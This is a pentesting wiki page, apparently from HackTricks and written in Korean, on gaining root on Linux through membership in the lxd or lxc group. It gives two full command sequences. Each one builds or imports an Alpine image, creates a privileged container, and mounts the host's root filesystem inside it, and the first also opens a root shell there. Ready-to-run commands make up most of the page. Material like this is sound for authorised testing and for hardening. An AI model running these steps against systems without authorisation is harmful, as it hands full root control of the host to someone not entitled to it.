# lxd/lxc Group - Privilege escalation

{{#include ../../../banners/hacktricks-training.md}}

_**lxd**_ **또는** _**lxc**_ **group**에 속해 있다면 root가 될 수 있습니다.

## 인터넷 없이 Exploiting

### Method 1

신뢰할 수 있는 repository에서 lxd와 함께 사용할 alpine image를 다운로드할 수 있습니다.  
Canonical은 해당 사이트에서 daily build를 게시합니다: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
가장 최신 build에서 **lxd.tar.xz**와 **rootfs.squashfs**를 모두 가져오면 됩니다. (Directory name은 날짜입니다.)

또는 다음 distro builder를 machine에 설치할 수 있습니다: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (github의 instructions를 따르세요):
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
**incus.tar.xz** (**lxd.tar.xz**, Canonical repository에서 다운로드한 경우)와 **rootfs.squashfs** 파일을 업로드하고, 이미지를 repo에 추가한 다음 container를 생성합니다:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> 다음 오류 _**Error: No storage pool found. Please create a new storage pool**_\
> 가 표시되면 **`lxd init`**을 실행하고 모든 옵션을 기본값으로 설정합니다. 그런 다음 이전 명령어 묶음을 **반복**합니다.

마지막으로 container를 실행하여 root 권한을 얻을 수 있습니다:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### 방법 2

Alpine image를 빌드하고 `security.privileged=true` 플래그를 사용해 시작하여, container가 host filesystem과 root로 상호작용하도록 강제합니다.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
